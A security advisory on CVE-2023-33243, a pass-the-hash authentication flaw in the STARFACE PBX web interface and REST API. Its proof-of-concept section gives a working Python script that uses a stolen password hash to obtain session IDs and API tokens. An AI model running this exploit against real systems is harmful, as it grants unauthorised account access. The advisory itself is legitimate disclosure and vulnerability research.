@@ -1,0 +1,289 @@
+id: 38757
+date: 06/01/2023
+title: STARFACE 7.3.0.10 Broken Authentication Exploit
+author: RedTeam
+cves: CVE-2023-33243
+
+RedTeam Pentesting discovered that the web interface of STARFACE as well
+as its REST API allows authentication using the SHA512 hash of the
+password instead of the cleartext password. While storing password
+hashes instead of cleartext passwords in an application's database
+generally has become best practice to protect users' passwords in case
+of a database compromise, this is rendered ineffective when allowing to
+authenticate using the password hash.
+
+
+Details
+=======
+
+Product: STARFACE
+Affected Versions: 7.3.0.10 and earlier versions
+Fixed Versions: -
+Vulnerability Type: Broken Authentication
+Security Risk: low
+Vendor URL: https://www.starface.de
+Vendor Status: notified
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2022-004
+Advisory Status: published
+CVE: CVE-2023-33243
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33243
+
+
+Introduction
+============
+
+"When functionality and comfort come together, the result is a
+state-of-the-art experience that we've dubbed 'comfortphoning'. It's a
+secure, scalable digital communication solution that meets every need
+and wish. STARFACE is easy to integrate into existing IT systems and
+flexibly grows with your requirements."
+
+(from the vendor's homepage)
+
+
+More Details
+============
+
+The image of STARFACE PBX [0] in version 7.3.0.10 can be downloaded from
+the vendor's homepage [1]. The included files can be further examined by
+either extracting the contents or running the image in a virtual
+machine. The web interface of the PBX uses the JavaScript file at the
+following path to submit the login form:
+
+------------------------------------------------------------------------
+js/prettifier.js
+------------------------------------------------------------------------
+
+The following two lines of the JavaScript file "prettifier.js" add the
+two parameters "secret" and "ack" to the form before being submitted:
+
+------------------------------------------------------------------------
+$form(document.forms[0]).add('secret', createHash(defaultVals.isAd, liv, lpv, defaultVals.k + defaultVals.bk));
+$form(document.forms[0]).add('ack', defaultVals.k);
+------------------------------------------------------------------------
+
+The JavaScript object "defaultVals" is included in the web application's
+source text. While the value of "defaultVals.k" was found to be the
+static hash of the PBX version, the value of "defaultVals.bk" contains a
+nonce only valid for the currently used session. Therefore, the form
+parameter "ack" is always the same value. For the form value "secret"
+the function "createHash()" is called with different arguments. The
+value of "defaultVals.isAd" is set to "false" when login via Active
+Directory is disabled. The parameters "liv" and "lpv" contain the
+username and password entered into the form respectively.
+
+------------------------------------------------------------------------
+const createHash = function (isAD, user, pass, nonces) {
+    if (isAD) {
+        return forAD.encode(user + nonces + pass);
+    }
+    return user + ':' + forSF(user + nonces + forSF(pass));
+};
+------------------------------------------------------------------------
+
+The expression right after the second return statement is the
+implementation used when Active Directory login is disabled which is the
+default setting. The return value is composed of the username separated
+via a colon from a value built using the "forSF()" function. The
+"forSF()" function was found to calculate the SHA512 hash value. When
+considering the arguments passed to the function, the hash is calculated
+as follows:
+
+------------------------------------------------------------------------
+SHA512(username + defaultVals.k + defaultVals.bk + SHA512(password))
+------------------------------------------------------------------------
+
+As can be seen, instead of the cleartext password the SHA512 hash of the
+password is used in the calculation. In conclusion, for the form value
+"secret" the following value is transmitted:
+
+------------------------------------------------------------------------
+username + ":" + SHA512(
+  username + defaultVals.k + defaultVals.bk + SHA512(password)
+)
+------------------------------------------------------------------------
+
+If the SHA512 hash of a user's password is known, it can be directly
+used in the calculation of the "secret" during the login process.
+Knowledge of the cleartext password is not required.
+
+This finding was also verified by analysing the decompiled Java code of
+the server component. It was also found that the authentication process
+of the REST API is vulnerable in a very similar manner.
+
+
+Proof of Concept
+================
+
+The following Python script can be used to perform a login by specifying
+a target URL, a username and the associated password hash:
+
+------------------------------------------------------------------------
+#!/usr/bin/env python3
+
+import click
+import hashlib
+import re
+import requests
+import typing
+
+
+def get_values_from_session(url, session) -> typing.Tuple[str, str]:
+    k, bk = "", ""
+    response_content = session.get(f"{url}/jsp/index.jsp").text
+    k_result = re.search("\sk : '([^']+)'", response_content)
+    bk_result = re.search("\sbk : '([^']+)'", response_content)
+    if k_result != None:
+        k = k_result.group(1)
+    if bk_result != None:
+        bk = bk_result.group(1)
+    return k, bk
+
+
+def web_login(url, login, pwhash, session) -> bool:
+    version, nonce = get_values_from_session(url, session)
+    if version == "" or nonce == "":
+        print("Web Login failed: Nonce and version hash can not be retrieved.")
+        return
+    value = login + version + nonce + pwhash
+    secret = hashlib.sha512(value.encode("utf-8")).hexdigest()
+    data = {
+        "forward": "",
+        "autologin": "false",
+        "secret": f"{login}:{secret}",
+        "ack": version,
+    }
+    login_request = session.post(
+        f"{url}/login",
+        data=data,
+        allow_redirects=False,
+        headers={"Referer": f"{url}/jsp/index.jsp"},
+    )
+    response_headers = login_request.headers
+    if "Set-Cookie" in response_headers:
+        session_id = response_headers["Set-Cookie"].split("=")[1].split(";")[0]
+        print(f"Session ID: {session_id}")
+        return True
+    else:
+        print("Invalid login data")
+        return False
+
+
+def get_nonce_from_api(url, session) -> str:
+    response_content = session.get(f"{url}/rest/login").json()
+    return response_content["nonce"] if "nonce" in response_content else ""
+
+
+def rest_login(url, login, pwhash, session):
+    nonce = get_nonce_from_api(url, session)
+    if nonce == "":
+        print("REST Login failed: Nonce can not be retrieved.")
+        return
+    value = login + nonce + pwhash
+    secret = hashlib.sha512(value.encode("utf-8")).hexdigest()
+    data = {"loginType": "Internal", "nonce": nonce, "secret": f"{login}:{secret}"}
+    login_request = session.post(
+        f"{url}/rest/login",
+        json=data,
+        headers={"Content-Type": "application/json", "X-Version": "2"},
+    )
+    response_data = login_request.json()
+    token = response_data["token"] if "token" in response_data else "none"
+    print(f"REST API Token: {token}")
+
+
+@click.command()
+@click.option('--url', help='Target System URL', required=True)
+@click.option('--login', help='Login ID', required=True)
+@click.option('--pwhash', help='Password Hash', required=True)
+def login(url, login, pwhash):
+    session = requests.session()
+    stripped_url = url.rstrip("/")
+    result = web_login(stripped_url, login, pwhash, session)
+    if result:
+        rest_login(stripped_url, login, pwhash, session)
+
+
+if __name__ == "__main__":
+    login()
+------------------------------------------------------------------------
+
+For example, the SHA512 hash of the password "starface" can be
+calculated as follows:
+
+------------------------------------------------------------------------
+$ echo -n "starface" | sha512sum
+a37542915e834f6e446137d759cdcb825a054d0baab73fd8db695fc49529bc8e52eb27979dd1dcc21849567bac74180f6511121f76f4a2a1f196670b7375f8ec -
+------------------------------------------------------------------------
+
+The Python script can be run as follows to perform a login as the user
+"0001" with the aforementioned hash:
+
+------------------------------------------------------------------------
+$ python3 login.py --url 'https://www.example.com' --login 0001 --pwhash
+'a37542915e834f6e446137d759cdcb825a054d0baab73fd8db695fc49529bc8e52eb27979dd1dcc21849567bac74180f6511121f76f4a2a1f196670b7375f8ec'
+Session ID: 2CF09656E274F000FFAD023AF37629CE
+REST API Token: 51eef8f8vp3d3u81k0imjbuuu7
+------------------------------------------------------------------------
+
+When the password hash is valid for the specified user of the targeted
+instance a session ID as well as a REST API token is returned.
+Afterwards, these values can be used to interact with the web
+application and the REST API.
+
+
+Workaround
+==========
+
+None
+
+
+Fix
+===
+
+On 4 May 2023, version 8.0.0.11 was released. In this version the
+vulnerability was addressed with a temporary solution, such that the
+password hashes are encrypted before they are saved in the database.
+This approach prevents attackers from exploiting this vulnerability in
+scenarios where they have only acquired pure database access. However,
+attackers with system level access can bypass this temporary measure as
+they can extract the encryption key and decrypt the hashes in the
+database. A solution that fixes this vulnerability entirely is still in
+progress.
+
+
+Security Risk
+=============
+
+The web interface and REST API of STARFACE allow to login using the
+password hash instead of the cleartext password. This can be exploited
+by attackers who gained access to the application's database where the
+passwords are also saved as a SHA512 hash of the cleartext passwords.
+While the precondition for this attack could be the full compromise of
+the STARFACE PBX, another attack scenario could be that attackers
+acquire access to backups of the database stored on another system.
+Furthermore, the login via password hash allows attackers for permanent
+unauthorised access to the web interface even if system access was
+obtained only temporarily. Due to the prerequisites of obtaining access
+to password hashes, the vulnerability poses a low risk only.
+
+
+Timeline
+========
+
+2022-12-06 Vulnerability identified
+2022-12-13 Customer approved disclosure to vendor
+2023-01-11 Vendor notified
+2023-05-04 Vendor released new version 8.0.0.11
+2023-05-19 CVE ID requested
+2023-05-20 CVE ID assigned
+2023-06-01 Advisory released
+
+
+References
+==========
+
+[0] https://starface.com/en/products/comfortphoning/
+[1] https://knowledge.starface.de/pages/viewpage.action?pageId=46564694
+
+#  0day.today [2023-06-08]  #
